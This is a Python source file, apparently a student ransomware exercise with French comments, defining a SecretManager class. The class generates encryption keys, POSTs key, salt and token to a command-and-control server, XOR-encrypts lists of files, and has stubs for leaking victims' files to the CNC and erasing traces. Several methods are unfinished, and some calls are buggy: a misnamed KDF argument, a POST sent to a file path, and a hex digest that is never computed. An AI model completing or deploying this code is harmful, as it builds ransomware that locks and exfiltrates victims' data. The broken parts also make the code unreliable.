from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64
import json

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="127.0.0.1:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)


    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        
        self._salt = salt
        kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length = SecretManager.KEY_LENGTH, SALT = self._salt, iterations = SecretManager.ITERATION)
        self._key = kdf.derive(key)

        return self._key


    def create(self)->Tuple[bytes, bytes, bytes]:
        
        self._key = os.urandom(SecretManager.KEY_LENGTH)
        self._salt = os.urandom(SecretManager.SALT_LENGTH)
        self._token = os.urandom(SecretManager.TOKEN_LENGTH)
        
        return [self._key, self._salt, self._token]


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")


    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        
        elements = {
            "token" : self.bin_to_b64(token),
            "salt" : self.bin_to_b64(salt),
            "key" : self.bin_to_b64(key)
        }
        jsonElements = json.dumps(elements)
        requests.post(self._path, jsonElements)
        

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc

        # on vérifie si le fichier est présent dans le répertoire
        if os.path.exists("token.bin"):
            file = open(self._path + "/token.bin", "rb")
            self._token = file.read()
            file.close()

        else:
             #création des éléments cryptographiques
            self._key, self._salt, self._token = self.create()

            #si le fichier n'est pas présent dans le répertoire, on le crée
            if os.path.exists(self._path):
                with open(os.path.join(self._path, "token.bin"), "wb") as file_token:
                    file_token.write(self._token)
                    file_token.close()

            else :
                os.mkdir(self._path)
                with open(os.path.join(self._path, "token.bin"), "wb") as file_token:
                    file_token.write(self._token)
                    file_token.close()
            
        with open(os.path.join(self._path, "salt.bin"), "wb") as file_salt:
            file_salt.write(self._salt)
            file_salt.close()
    

    def load(self)->None:
        # function to load crypto data
        raise NotImplemented()


    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        raise NotImplemented()


    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        raise NotImplemented()


    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        
        hashed_token = sha256()
        hashed_token.update(self._token)
        hashed_token.hexdigest

        return hashed_token


    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        xorfile(files, self._key)


    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()


    def clean(self):
        # remove crypto data from the target
        raise NotImplemented()